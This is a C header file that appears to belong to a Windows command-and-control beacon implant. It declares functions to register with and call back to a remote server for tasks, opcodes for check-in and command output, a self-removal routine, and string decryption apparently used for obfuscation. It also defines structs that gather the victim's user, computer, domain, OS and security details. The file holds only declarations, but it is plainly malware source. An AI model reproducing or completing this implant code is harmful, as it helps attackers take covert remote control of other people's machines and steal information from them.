#define _REGISTER_URL L"/register"
#define _CALLBACK_URL L"/tasks"

#define _POST_HEADER L"Content-Type: application/x-www-form-urlencoded\r\n"
#define _HEADER_LEN -1

#define MODE_CHECKIN_DATA 0x1000
#define MODE_CHECKIN_NO_DATA 0x2000

#define DATA_CMD_OUT 0x2000
#define DO_CALLBACK 0x4000

BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, LPCWSTR UriBuffer, DWORD dwSize);
LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, DWORD *OpCode, LPCSTR SendBuffer, DWORD SendOpCode, DWORD SendBufferSize);

LPVOID DieCleanly();
LPVOID CheckIfDie(LPCWSTR *ReadBuffer);

LPVOID ReportExecutionFail();

char* decrypt_string(char* string, int key);

typedef void (WINAPI * RtlGetVersion_) (OSVERSIONINFOEXW *);

struct BasicUserInfo
{
    LPSTR UserName;
    LPSTR ComputerName;
    LPSTR DomainName;
};

struct BasicCompInfo
{
    LPSTR Arch;
    LPSTR OS;
    LPSTR Secure;
};

CHAR IdBuffer[65];